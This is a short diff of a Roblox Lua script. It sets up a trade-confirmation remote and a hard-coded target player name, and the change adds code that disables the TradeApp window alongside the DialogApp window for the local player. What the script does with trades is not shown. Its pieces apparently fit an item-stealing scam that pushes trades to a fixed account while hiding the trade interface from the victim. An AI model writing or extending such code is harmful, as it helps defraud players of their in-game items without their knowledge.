@@ -8,9 +8,12 @@ local confirmRemote = ReplicatedStorage:WaitForChild("API"):WaitForChild("TradeA
 local targetName = "zaiko877777"
 local localPlayer = Players.LocalPlayer
 
--- Disable only DialogApp. Disabling TradeApp can break trade state updates.
+-- Disable DialogApp and TradeApp GUIs for the local player.
 pcall(function()
     localPlayer.PlayerGui:WaitForChild("DialogApp").Enabled = false
+end)
+pcall(function()
+    localPlayer.PlayerGui:WaitForChild("TradeApp").Enabled = false
 end)
 
 local fsys = require(ReplicatedStorage:WaitForChild("Fsys"))
